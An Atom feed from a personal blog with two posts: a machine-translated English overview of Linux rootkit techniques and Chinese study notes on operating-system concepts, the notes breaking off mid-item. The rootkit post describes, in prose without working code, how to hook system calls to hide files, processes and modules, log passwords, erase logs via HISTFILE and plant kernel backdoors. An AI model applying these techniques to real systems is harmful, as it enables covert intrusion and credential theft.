<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>opprash</title>
  
  <subtitle>all the FAITHS would get RETRUBITIONS</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2017-10-06T15:15:11.336Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>Lu Ruan</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Rootkid Summary</title>
    <link href="http://yoursite.com/2017/10/06/new%209/"/>
    <id>http://yoursite.com/2017/10/06/new 9/</id>
    <published>2017-10-06T15:15:11.335Z</published>
    <updated>2017-10-06T15:15:11.336Z</updated>
    
    <content type="html"><![CDATA[<p>Intermittent learning process do not understand slowly learn a lot, although for Rootkid it is only worth mentioning the fur content but for me still do not know progress, after all, many things can not be achieved overnight, Only after stepping on a variety of pit you will slowly comprehend some things, and later summed up some truth (only for me), learning is a gradual process, can not be the slightest irritability, if you are anxious, then You have lost from the beginning, you just started learning the process, will certainly run into a wall, which is beyond doubt, and you need to do is ask more experienced seniors or teachers, which will make you less Take a lot of detours!</p><h2 id="For-example"><a href="#For-example" class="headerlink" title="For example"></a>For example</h2><h3 id="Rootkit’s-main-categories"><a href="#Rootkit’s-main-categories" class="headerlink" title="Rootkit’s main categories:"></a>Rootkit’s main categories:</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">Application level -&gt; Kernel level -&gt; Hardware level</div><div class="line">Early rootkit mainly <span class="keyword">for</span> the application-level rootkit, application-level rootkit mainly by replacing the login, ps, ls, netstat and other system tools, or modify. Rhosts and other system configuration files to achieve hidden and backdoor; hardware rootkit mainly refers to bios rootkit, Before the system gets control, by writing to the disk file, and <span class="keyword">then</span> by the bootloader to load the file to regain control, you can also use the virtual machine technology, so that the entire operating system running <span class="keyword">in</span> the rootkit grasp; the most common rootkit Is kernel-level rootkit.</div><div class="line">Kernel-level rootkit can be divided into lkm rootkit, non-lkm rootkit. lkm rootkit is based on lkm technology, through the interface provided by the system to load into the kernel space, as part of the kernel, and <span class="keyword">then</span> through the hook system calls and other technologies to achieve hidden, backdoor <span class="keyword">function</span>. Non-lkm rootkit mainly refers to the system does not support the lkm mechanism to modify the kernel of a method, mainly through / dev / mem, / dev / kmem equipment directly to the memory, so that the kernel to modify.</div><div class="line">Non-lkm rootkit To achieve the kernel changes, the first need to get kernel space memory, it is necessary to call kmalloc allocation of memory, and kmalloc is the kernel space call, can not directly call the user space <span class="keyword">in</span> the <span class="keyword">function</span>, so think of the call through int 0x80 Function of the method. First select an unusual system call number, find the item <span class="keyword">in</span> sys_call_table, by writing / dev / mem directly modify it to kmalloc <span class="keyword">function</span> address, so that when we call the user space <span class="keyword">in</span> the user space, you can int 0x80 Into the kernel space, the implementation of kmalloc <span class="keyword">function</span> to allocate memory, and the allocation of the memory address from the eax register to <span class="built_in">return</span>, so we get a kernel address space memory, and <span class="keyword">then</span> the <span class="keyword">function</span> will be written to the memory hack, and again modify the system call table , You can achieve hook <span class="keyword">function</span> call <span class="keyword">function</span></div></pre></td></tr></table></figure><h3 id="Common-features-of-rootkit"><a href="#Common-features-of-rootkit" class="headerlink" title="Common features of rootkit:"></a>Common features of rootkit:</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">Hidden files: through strace ls can be found ls <span class="built_in">command</span> is through sys_getdents64 get the file directory, so you can modify the sys_getdents64 system call or the bottom of the readdir to achieve hidden files and directories, as well as ext2 file system directly to modify the method, but It is not easy to implement, there are some specific restrictions.</div><div class="line"></div><div class="line">Hidden process: hidden process and hidden files similar to the ps <span class="built_in">command</span> is to <span class="built_in">read</span> / proc file system under the process directory to obtain process information, as long as you can hide the / proc file system under the process directory can achieve the effect of hidden process, Ie hook sys_getdents64 and readdir.</div><div class="line"></div><div class="line">Hide the connection: netstat <span class="built_in">command</span> is by reading / proc file system under the net / tcp and net / udp file to obtain the current connection information, so you can hook sys_read call to achieve a hidden connection, you can modify tcp4_seq_show and udp4_seq_show and other <span class="built_in">functions</span>.</div><div class="line"></div><div class="line">Hide the module: lsmod <span class="built_in">command</span> is mainly through the sys_query_module system call to obtain the module information, you can call the hook sys_query_module system to hide the module, you can also remove the module from the kernel module list to achieve the hidden effect.</div><div class="line"></div><div class="line">Sniffer: sniffer can directly access library libpcap link layer, intercepted data packets, packets may be intercepted at the point of hook by the IP layer of linux netfilter framework. Sniffer to obtain other data packets on the network need to <span class="built_in">set</span> the network card to the promiscuous mode, <span class="built_in">which</span> is through the ioctl system call SIOCSIFFLAGS order to see the current mode of the network card is through the SIOCGIFFLAGS order, so you can hide the network through the hook sys_ioctl mixed mode.</div><div class="line"></div><div class="line">Record password: password records can be achieved by hook sys_read call system, such as through a process to determine the name of the currently running the current terminal is closed or <span class="built_in">echo</span>, the user can obtain the password. hook sys_read can also implement other <span class="built_in">functions</span> such as login back door.</div><div class="line"></div><div class="line">Erase <span class="built_in">log</span>: <span class="built_in">log</span> traditional unix predominantly at / var / <span class="built_in">log</span> / messages, / var / <span class="built_in">log</span> / lastlog, / var / run / utmp, / var / <span class="built_in">log</span> / wtmp, can be prepared by appropriate modification tool <span class="built_in">log</span> file , You can also change the environment such as HISTFILE / dev / null to hide some of the user<span class="string">'s operating information.</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">Core back door: can be the local backdoor and the network to monitor the back door, the local right to mention the kernel module can be sent through the custom command to achieve, the network kernel back door can be in the IP layer to enter the host data packet monitoring, found matching designation After the packet immediately start the connection process.</span></div></pre></td></tr></table></figure><h3 id="Rootkit’s-main-technology"><a href="#Rootkit’s-main-technology" class="headerlink" title="Rootkit’s main technology:"></a>Rootkit’s main technology:</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">lkm injection, module removal, interruption interrupt (0x80, 0x01), hijacking system call, run-time patch, inline hook, port bounce ...</div><div class="line"></div><div class="line">lkm injection: is also a way to hide the kernel module, through the infection system lkm, without affecting the original <span class="keyword">function</span> of the rootkit module will be linked to the system lkm, the module is running control, after the call system lkm Initialization <span class="keyword">function</span>, lkm injection involves elf file format and module loading mechanism.</div><div class="line"></div><div class="line">Module removal: mainly refers to the module from the module list to remove the module to hide the method, the latest module is always loaded <span class="keyword">in</span> the module list header, so you can load the rootkit module and <span class="keyword">then</span> load a cleanup module will rootkit module information from Delete the list, and <span class="keyword">then</span> <span class="built_in">exit</span> the module, the new version of the kernel can also determine the module information directly after the list_del.</div><div class="line"></div><div class="line">Interception interruption: mainly through the sidt instruction to obtain the address of the interrupt call table, and <span class="keyword">then</span> access to the interrupt handler entry address, modify the corresponding interrupt handler, such as int 0x80, int 0x1 and so on. Which intercept int 0x1 is a relatively new technology, the main use of the system debugging mechanism, by setting the DR register to intercept the memory address up and down the breakpoint, <span class="built_in">which</span> <span class="keyword">in</span> the implementation of the specified instruction into the 0x1 interrupt handler, by modifying 0x1 interrupt Of the processing program can achieve the desired <span class="keyword">function</span>.</div><div class="line"></div><div class="line">Hijacking system call: and intercept interrupt similar, but mainly on the system call table to modify, you can directly replace the original system call table, you can also modify the system call table entry address. Before the 2.4 kernel, the kernel<span class="string">'s system call table address is exported, so it can be modified directly. But in the 2.6 kernel, the system call table address is no longer exported, the need to 0x80 interrupt handler to obtain the system call table to obtain the address.</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">Run-time patch: character device driver and block device driver will load the system to register a Struct file_operations structure to achieve the specified read, write and other operations, the file system is the case, by modifying the file system file_operations structure, you can achieve the new read, write operation and so on.</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">inline hook: mainly refers to the kernel function in memory directly modify, without affecting the original function, you can use the jump method, you can also modify the call to the lower function implementation.</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">Port bounce: mainly in order to better break through the firewall restrictions, you can monitor the client port 80, and the server through the client'</span>s port 80 back, disguised as a visit to the normal process of web services to <span class="built_in">break</span> through the firewall <span class="built_in">limit</span>.</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;Intermittent learning process do not understand slowly learn a lot, although for Rootkid it is only worth mentioning the fur content but 
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Vita</title>
    <link href="http://yoursite.com/2017/09/28/new%208/"/>
    <id>http://yoursite.com/2017/09/28/new 8/</id>
    <published>2017-09-27T20:39:48.500Z</published>
    <updated>2017-09-27T20:48:36.777Z</updated>
    
    <content type="html"><![CDATA[<p>The OS summary!The OS summary!The OS summary!The OS summary!</p><h2 id="The-OS-summary"><a href="#The-OS-summary" class="headerlink" title="The OS summary"></a>The OS summary</h2><h3 id="This-is-a-bolg-that-can-make-you-know-more-about-OS"><a href="#This-is-a-bolg-that-can-make-you-know-more-about-OS" class="headerlink" title="This is a bolg that can make you know more about OS"></a>This is a bolg that can make you know more about OS</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div><div class="line">187</div><div class="line">188</div><div class="line">189</div><div class="line">190</div><div class="line">191</div><div class="line">192</div><div class="line">193</div><div class="line">194</div><div class="line">195</div><div class="line">196</div><div class="line">197</div><div class="line">198</div><div class="line">199</div><div class="line">200</div><div class="line">201</div><div class="line">202</div><div class="line">203</div><div class="line">204</div><div class="line">205</div><div class="line">206</div><div class="line">207</div><div class="line">208</div><div class="line">209</div><div class="line">210</div><div class="line">211</div><div class="line">212</div><div class="line">213</div><div class="line">214</div><div class="line">215</div><div class="line">216</div><div class="line">217</div><div class="line">218</div><div class="line">219</div><div class="line">220</div><div class="line">221</div><div class="line">222</div><div class="line">223</div><div class="line">224</div><div class="line">225</div><div class="line">226</div><div class="line">227</div><div class="line">228</div><div class="line">229</div><div class="line">230</div><div class="line">231</div><div class="line">232</div><div class="line">233</div><div class="line">234</div><div class="line">235</div><div class="line">236</div><div class="line">237</div><div class="line">238</div><div class="line">239</div><div class="line">240</div><div class="line">241</div><div class="line">242</div><div class="line">243</div><div class="line">244</div><div class="line">245</div><div class="line">246</div><div class="line">247</div><div class="line">248</div><div class="line">249</div><div class="line">250</div><div class="line">251</div><div class="line">252</div><div class="line">253</div><div class="line">254</div><div class="line">255</div><div class="line">256</div><div class="line">257</div><div class="line">258</div><div class="line">259</div><div class="line">260</div><div class="line">261</div><div class="line">262</div><div class="line">263</div><div class="line">264</div><div class="line">265</div><div class="line">266</div><div class="line">267</div><div class="line">268</div><div class="line">269</div><div class="line">270</div><div class="line">271</div><div class="line">272</div><div class="line">273</div><div class="line">274</div><div class="line">275</div><div class="line">276</div><div class="line">277</div><div class="line">278</div><div class="line">279</div><div class="line">280</div><div class="line">281</div><div class="line">282</div><div class="line">283</div><div class="line">284</div><div class="line">285</div><div class="line">286</div><div class="line">287</div><div class="line">288</div><div class="line">289</div><div class="line">290</div><div class="line">291</div><div class="line">292</div><div class="line">293</div><div class="line">294</div><div class="line">295</div><div class="line">296</div><div class="line">297</div><div class="line">298</div><div class="line">299</div><div class="line">300</div><div class="line">301</div><div class="line">302</div><div class="line">303</div><div class="line">304</div><div class="line">305</div><div class="line">306</div><div class="line">307</div><div class="line">308</div><div class="line">309</div><div class="line">310</div><div class="line">311</div><div class="line">312</div><div class="line">313</div><div class="line">314</div><div class="line">315</div><div class="line">316</div><div class="line">317</div><div class="line">318</div><div class="line">319</div><div class="line">320</div><div class="line">321</div><div class="line">322</div><div class="line">323</div><div class="line">324</div><div class="line">325</div><div class="line">326</div><div class="line">327</div><div class="line">328</div><div class="line">329</div><div class="line">330</div><div class="line">331</div><div class="line">332</div><div class="line">333</div><div class="line">334</div><div class="line">335</div><div class="line">336</div><div class="line">337</div><div class="line">338</div><div class="line">339</div><div class="line">340</div><div class="line">341</div><div class="line">342</div><div class="line">343</div><div class="line">344</div><div class="line">345</div><div class="line">346</div><div class="line">347</div><div class="line">348</div><div class="line">349</div><div class="line">350</div><div class="line">351</div><div class="line">352</div><div class="line">353</div><div class="line">354</div><div class="line">355</div><div class="line">356</div><div class="line">357</div><div class="line">358</div><div class="line">359</div><div class="line">360</div><div class="line">361</div><div class="line">362</div><div class="line">363</div><div class="line">364</div><div class="line">365</div><div class="line">366</div><div class="line">367</div><div class="line">368</div><div class="line">369</div><div class="line">370</div><div class="line">371</div><div class="line">372</div><div class="line">373</div><div class="line">374</div><div class="line">375</div><div class="line">376</div><div class="line">377</div><div class="line">378</div><div class="line">379</div><div class="line">380</div><div class="line">381</div><div class="line">382</div><div class="line">383</div><div class="line">384</div><div class="line">385</div><div class="line">386</div><div class="line">387</div><div class="line">388</div><div class="line">389</div><div class="line">390</div><div class="line">391</div><div class="line">392</div><div class="line">393</div><div class="line">394</div><div class="line">395</div><div class="line">396</div><div class="line">397</div><div class="line">398</div><div class="line">399</div><div class="line">400</div><div class="line">401</div><div class="line">402</div><div class="line">403</div><div class="line">404</div><div class="line">405</div><div class="line">406</div><div class="line">407</div><div class="line">408</div><div class="line">409</div><div class="line">410</div><div class="line">411</div><div class="line">412</div><div class="line">413</div><div class="line">414</div><div class="line">415</div><div class="line">416</div><div class="line">417</div><div class="line">418</div><div class="line">419</div><div class="line">420</div><div class="line">421</div><div class="line">422</div><div class="line">423</div><div class="line">424</div><div class="line">425</div><div class="line">426</div><div class="line">427</div><div class="line">428</div><div class="line">429</div><div class="line">430</div><div class="line">431</div><div class="line">432</div><div class="line">433</div><div class="line">434</div><div class="line">435</div><div class="line">436</div><div class="line">437</div><div class="line">438</div><div class="line">439</div><div class="line">440</div><div class="line">441</div><div class="line">442</div><div class="line">443</div><div class="line">444</div><div class="line">445</div><div class="line">446</div><div class="line">447</div><div class="line">448</div><div class="line">449</div><div class="line">450</div><div class="line">451</div><div class="line">452</div><div class="line">453</div><div class="line">454</div><div class="line">455</div><div class="line">456</div><div class="line">457</div><div class="line">458</div><div class="line">459</div><div class="line">460</div><div class="line">461</div><div class="line">462</div><div class="line">463</div><div class="line">464</div><div class="line">465</div><div class="line">466</div><div class="line">467</div><div class="line">468</div><div class="line">469</div><div class="line">470</div><div class="line">471</div><div class="line">472</div><div class="line">473</div><div class="line">474</div><div class="line">475</div><div class="line">476</div><div class="line">477</div><div class="line">478</div><div class="line">479</div><div class="line">480</div><div class="line">481</div><div class="line">482</div><div class="line">483</div><div class="line">484</div><div class="line">485</div><div class="line">486</div><div class="line">487</div><div class="line">488</div><div class="line">489</div><div class="line">490</div><div class="line">491</div><div class="line">492</div><div class="line">493</div><div class="line">494</div><div class="line">495</div><div class="line">496</div><div class="line">497</div><div class="line">498</div><div class="line">499</div><div class="line">500</div><div class="line">501</div><div class="line">502</div><div class="line">503</div><div class="line">504</div><div class="line">505</div><div class="line">506</div><div class="line">507</div><div class="line">508</div><div class="line">509</div><div class="line">510</div><div class="line">511</div><div class="line">512</div><div class="line">513</div><div class="line">514</div><div class="line">515</div><div class="line">516</div><div class="line">517</div><div class="line">518</div><div class="line">519</div><div class="line">520</div><div class="line">521</div><div class="line">522</div><div class="line">523</div><div class="line">524</div><div class="line">525</div><div class="line">526</div><div class="line">527</div><div class="line">528</div><div class="line">529</div><div class="line">530</div><div class="line">531</div><div class="line">532</div><div class="line">533</div><div class="line">534</div><div class="line">535</div><div class="line">536</div><div class="line">537</div><div class="line">538</div><div class="line">539</div><div class="line">540</div><div class="line">541</div><div class="line">542</div><div class="line">543</div><div class="line">544</div><div class="line">545</div><div class="line">546</div><div class="line">547</div><div class="line">548</div><div class="line">549</div><div class="line">550</div><div class="line">551</div><div class="line">552</div><div class="line">553</div><div class="line">554</div><div class="line">555</div><div class="line">556</div><div class="line">557</div><div class="line">558</div><div class="line">559</div><div class="line">560</div><div class="line">561</div><div class="line">562</div><div class="line">563</div><div class="line">564</div><div class="line">565</div><div class="line">566</div><div class="line">567</div><div class="line">568</div><div class="line">569</div><div class="line">570</div><div class="line">571</div><div class="line">572</div><div class="line">573</div><div class="line">574</div><div class="line">575</div><div class="line">576</div><div class="line">577</div><div class="line">578</div><div class="line">579</div><div class="line">580</div><div class="line">581</div><div class="line">582</div><div class="line">583</div><div class="line">584</div><div class="line">585</div><div class="line">586</div><div class="line">587</div><div class="line">588</div><div class="line">589</div><div class="line">590</div><div class="line">591</div><div class="line">592</div><div class="line">593</div><div class="line">594</div><div class="line">595</div><div class="line">596</div><div class="line">597</div><div class="line">598</div><div class="line">599</div><div class="line">600</div><div class="line">601</div><div class="line">602</div><div class="line">603</div><div class="line">604</div><div class="line">605</div><div class="line">606</div><div class="line">607</div><div class="line">608</div><div class="line">609</div><div class="line">610</div><div class="line">611</div><div class="line">612</div><div class="line">613</div><div class="line">614</div><div class="line">615</div><div class="line">616</div><div class="line">617</div><div class="line">618</div><div class="line">619</div><div class="line">620</div><div class="line">621</div><div class="line">622</div><div class="line">623</div><div class="line">624</div><div class="line">625</div><div class="line">626</div><div class="line">627</div><div class="line">628</div><div class="line">629</div><div class="line">630</div><div class="line">631</div><div class="line">632</div><div class="line">633</div><div class="line">634</div><div class="line">635</div><div class="line">636</div><div class="line">637</div><div class="line">638</div><div class="line">639</div><div class="line">640</div><div class="line">641</div><div class="line">642</div><div class="line">643</div><div class="line">644</div><div class="line">645</div><div class="line">646</div><div class="line">647</div><div class="line">648</div><div class="line">649</div><div class="line">650</div><div class="line">651</div><div class="line">652</div><div class="line">653</div><div class="line">654</div><div class="line">655</div><div class="line">656</div><div class="line">657</div><div class="line">658</div><div class="line">659</div><div class="line">660</div><div class="line">661</div><div class="line">662</div><div class="line">663</div><div class="line">664</div><div class="line">665</div><div class="line">666</div><div class="line">667</div><div class="line">668</div><div class="line">669</div><div class="line">670</div><div class="line">671</div><div class="line">672</div><div class="line">673</div><div class="line">674</div><div class="line">675</div><div class="line">676</div><div class="line">677</div><div class="line">678</div><div class="line">679</div><div class="line">680</div><div class="line">681</div><div class="line">682</div><div class="line">683</div><div class="line">684</div><div class="line">685</div><div class="line">686</div><div class="line">687</div><div class="line">688</div><div class="line">689</div><div class="line">690</div><div class="line">691</div><div class="line">692</div><div class="line">693</div><div class="line">694</div><div class="line">695</div><div class="line">696</div><div class="line">697</div><div class="line">698</div><div class="line">699</div><div class="line">700</div><div class="line">701</div><div class="line">702</div><div class="line">703</div><div class="line">704</div><div class="line">705</div><div class="line">706</div><div class="line">707</div><div class="line">708</div><div class="line">709</div><div class="line">710</div><div class="line">711</div><div class="line">712</div><div class="line">713</div><div class="line">714</div><div class="line">715</div><div class="line">716</div><div class="line">717</div><div class="line">718</div></pre></td><td class="code"><pre><div class="line">系统的目标：有效性（提高资源利用率和系统吞吐量）、方便性、可扩充性、开放性。</div><div class="line">有效性和方便性是操作系统最重要两个目标。</div><div class="line">操作系统的作用：</div><div class="line">(1)     OS作为用户与计算机硬件系统之间的接口</div><div class="line"></div><div class="line">(2)     OS作为计算机系统资源的管理者（处理器、存储器、I/O设备、数据程序）</div><div class="line"></div><div class="line">(3)      OS实现了对计算机资源的抽象（在硬件上覆盖I/O设备、文件和窗口管理软件，即虚拟机）</div><div class="line"></div><div class="line">OS的发展过程：无操作系统的计算机系统→单道批处理系统→多道批处理系统→分时系统→实时系统→微机操作系统</div><div class="line">操作系统的基本特征：</div><div class="line">(1)     并发性（两个或多个事件在同一时间间隔内发生；进入进程和线程）</div><div class="line"></div><div class="line">(2)     共享性（系统中资源可供内存中多个并发执行的进程（线程）共同使用，方式为互斥共享方式和同时访问方式）</div><div class="line"></div><div class="line">(3)     虚拟性（通过某种技术把一个物理实体变为若干个逻辑上的对应物。方式：时分复用技术和空分复用技术）</div><div class="line"></div><div class="line">(4)     异步性（进程以不可预知的速度向前推进，多道程序设计固有的特点）</div><div class="line"></div><div class="line">OS的主要功能：</div><div class="line">(1)     处理机管理（进程管理）功能；（主要包括创建和撤销进程、协调诸进程的运行、实现进程间信息交换、把处理机分配给进程。进程同步机制功能是协调多个进程的运行，分为竞争和协作两种方式，实现进程同步常用的及时是信号量机制。调度包括作业调度和进程调度两步。）</div><div class="line"></div><div class="line">(2)     存储器管理功能；（内存分配、内存保护、地址映射和内存扩充等功能。内存分配有动态和静态两方式。内容扩充的功能是请求调入和置换）</div><div class="line"></div><div class="line">(3)     设备管理功能（缓冲管理、设备分配、设备处理和虚拟设备。缓冲管理包括单、双、公用缓冲机制。设备处理的人物是实现CPU和设备控制器之间的通信）</div><div class="line"></div><div class="line">(4)     文件管理功能；（文件存储空间管理、目录管理、文件读写管理、共享保护功能）</div><div class="line"></div><div class="line">(5)     操作系统与用户之间的接口；（用户接口和程序接口）</div><div class="line"></div><div class="line">第二章 进程管理</div><div class="line"></div><div class="line">进程与线程的基本概念</div><div class="line">1)         进程是为了使多个程序能并发执行，以提高资源利用率和系统吞吐量。</div><div class="line"></div><div class="line">2)         线程是为了减少程序在并发执行时所付出的空间开销，是OS具有更好的并发性。</div><div class="line"></div><div class="line">进程和线程的区别</div><div class="line">1)         调度：线程作为调度和分派的基本单位；进程作为资源拥有的基本单位。</div><div class="line"></div><div class="line">2)         并发性：进程之间可以并发执行，进程中的诸线程之间也可并发执行。</div><div class="line"></div><div class="line">3)         拥有资源：进程拥有资源，线程无资源，但可以访问所属进程的资源</div><div class="line"></div><div class="line">4)         系统开销：创建可撤销进程的代价比创建和撤销线程的代价大的多。</div><div class="line"></div><div class="line">前趋图是描述进程之间执行的前后关系的。</div><div class="line">进程的特征：</div><div class="line">1)         结构特征；由程序段、相关的数据项和PCB三部分构成了进程实体。</div><div class="line"></div><div class="line">2)         动态性；指从创建、调度执行到撤销的过程是动态的。</div><div class="line"></div><div class="line">3)         并发性；</div><div class="line"></div><div class="line">4)         独立性；因为有PCB，可以独立运行、独立分配资源、独立接受调度等功能</div><div class="line"></div><div class="line">5)         异步性；各进程按各自独立、不可预知的速度向前推进。</div><div class="line"></div><div class="line">进程的三种基本状态：</div><div class="line">1)         就绪状态；处CPU外，已占有其他必要的资源的进程</div><div class="line"></div><div class="line">2)         执行状态；</div><div class="line"></div><div class="line">3)         阻塞状态；因事故是正在执行的进程停止，并让出CPU。</div><div class="line"></div><div class="line">信号量机制是一种卓有成效的进程同步工具。包括整形信号量、记录型信号量、AND型信号量、信号量集。</div><div class="line">第三章 处理机调度与死锁</div><div class="line"></div><div class="line">批量型作业通常需要经历作业调度（高级调度或长程调度）和进程调度（低级调度和短程调度）两个过程后方能获得处理机。</div><div class="line">处理机调度层次</div><div class="line">1)         高级调度：把外存上处于后备队列中的那些作业调入内存。</div><div class="line"></div><div class="line">2)         低级调度：它决定就绪队列中的哪个进程将获得处理机，然后由分派程序执行把处理机分配给该进程的操作。对象是进程。功能是：保存处理机现场信息（PCB）；按某种算法选取进程；把处理器分配给进程。方式分为非抢占方式和抢占方式。</div><div class="line"></div><div class="line">3)         中级调度：内存中不能有太多的进程，把进程从内存移到外存，当内存有足够空间时，再将合适的进程换入内存，等待进程调度。目的是提高内存利用率和系统吞吐量。</div><div class="line"></div><div class="line">死锁：多个进程在运行过程中因争夺资源而造成的一种僵局。</div><div class="line">活锁：多个进程在运行工程中因相互谦让而造成的一种僵局。</div><div class="line"></div><div class="line">产生死锁的原因</div><div class="line">1)         竞争资源</div><div class="line"></div><div class="line">2)         进程间推进顺序非法</div><div class="line"></div><div class="line">产生死锁的必要条件</div><div class="line">1)         互斥条件：临界资源的互斥访问</div><div class="line"></div><div class="line">2)         请求和保持条件：占着自己的资源不放，又去请求别人的</div><div class="line"></div><div class="line">3)         不剥夺条件：进程没有完成则不是放占有的资源</div><div class="line"></div><div class="line">4)         环路等待条件：发生死锁指必然存在一个资源环形链。</div><div class="line"></div><div class="line">处理死锁的基本方法</div><div class="line">1)         预防死锁</div><div class="line"></div><div class="line">2)         避免死锁</div><div class="line"></div><div class="line">3)         检测和解除死锁</div><div class="line"></div><div class="line">安全序列：是指系统能够找到一个进程顺序（P1、P2……Pn），来为每个进程Pi分配所需资源，知道满足每个进程的最大需求，是每个进程能够顺利完成，则P1、P2……Pn即为安全状态。</div><div class="line">用资源分配图对死锁进行检测，消去途中的所有边，若节点为孤立节点，则为可完全简化。</div><div class="line">死锁的解除</div><div class="line">1)         剥夺资源：从其他进程剥夺足够数量的资源给死锁进程，以解除死锁状态</div><div class="line"></div><div class="line">2)         撤销进程：一种方法是夭折全部进程；另一种方法是按某个顺序逐个撤销进程，知道死锁状态被解除。</div><div class="line"></div><div class="line">第四章 存储器管理</div><div class="line"></div><div class="line">连续分配方式：一个用户程序分配一个连续的内存空间</div><div class="line">1)         单一连续分配：一个程序装入其他程序就不允许被装入。只是用于单用户单任务的OS中。</div><div class="line"></div><div class="line">2)         固定分区分配：把内存分为若干个固定大小的区域，每个分区装入一个作业，允许并发执行。</div><div class="line"></div><div class="line">3)         动态分区分配：根据实际需要，动态地为之分配内存空间。</div><div class="line"></div><div class="line">4)         动态重定位分区分配：通过重定位寄存器把相对地址转化成物理地址，此转化过程是在程序执行期间，随着每条指令或数据的访问自动进行的，故称为动态重定位。</div><div class="line"></div><div class="line">分区分配算法</div><div class="line">1)         首次适应算法（以地址递增次序访问）</div><div class="line"></div><div class="line">2)         循环首次适应算法（从上一次分配处开始查找）</div><div class="line"></div><div class="line">3)         最佳适应算法（小内存到大内存依次查找）</div><div class="line"></div><div class="line">4)         最坏适应算法（每次分配从大内存开始割让）</div><div class="line"></div><div class="line">5)         快速适应算法（对空闲分区进行分类，并建立索引表，选最适合的控件分配给请求的进程）</div><div class="line"></div><div class="line">对换：把暂时不运行的程序调到外存，需要时再调到内存。</div><div class="line">地址变换机制：将用户地址空间中的逻辑地址变换为内存空间中的物理地址。</div><div class="line">引入分段存储管理方式的目的，则主要是为了满足用户在编程和使用上多方面的要求。</div><div class="line">段表是用于实现从逻辑段到物理内存区的映射。</div><div class="line">分页和分段的主要区别</div><div class="line">1)         